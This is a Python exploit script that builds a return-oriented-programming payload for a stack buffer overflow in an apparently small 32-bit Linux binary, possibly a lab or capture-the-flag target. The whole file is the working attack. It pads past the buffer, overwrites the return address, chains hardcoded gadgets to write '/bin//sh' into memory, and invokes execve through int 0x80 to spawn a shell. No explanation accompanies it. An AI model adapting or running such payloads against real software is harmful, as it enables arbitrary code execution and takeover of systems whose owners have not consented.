import os, sys, struct

offset = 0x0

pop_eax = 0x08048425 + offset #pop eax; ret
pop_ebx = 0x08048427 + offset #pop ebx; ret
pop_ecx = 0x08048429 + offset #pop ecx; ret
pop_edx = 0x0804842b + offset #pop edx; ret
zero_edx = 0x08048420 + offset #xor edx, edx ; ret
zero_eax = 0x08048413 + offset #xor eax, eax ; ret
zero_ecx = 0x0804841d + offset #xor ecx, ecx ; ret
inc_eax = 0x08048418 + offset #inc eax ; ret
writewhatwhere = 0x0804842f + offset #mov dword ptr [edx], eax ; ret
syscall = 0x8048410 + offset #int 0x80

writable_memory = 0x0804a010
padding = "X"
text = "A shell\n\n\n"
EBPoverwrite = "AAAA"

def address(addr):
        return struct.pack("<L", addr)

buffer = text + padding * (76-len(text))
buffer += EBPoverwrite

buffer += address(pop_edx) #return address overwrite 
buffer += address(writable_memory)
buffer += address(pop_eax)
buffer += "/bin"
buffer += address(writewhatwhere) #store gadget

buffer += address(pop_edx)
buffer += address(writable_memory + 4)
buffer += address(pop_eax)
buffer += "//sh"
buffer += address(writewhatwhere)

buffer += address(pop_edx)
buffer += address(writable_memory + 8)
buffer += address(zero_eax) #zero means null bytes
buffer += address(writewhatwhere)


#buffer += address(zero_edx)

buffer += address(pop_ebx)
buffer += address(writable_memory)

buffer += address(pop_ecx)
buffer += address(writable_memory + 8)
#buffer += address(zero_ecx)

buffer += address(pop_edx)
buffer += address(writable_memory + 8)

buffer += address(pop_eax)
buffer += struct.pack("<I", 0x0000000B) #system call number 11


buffer += address(syscall) #int 0x80

print(buffer)

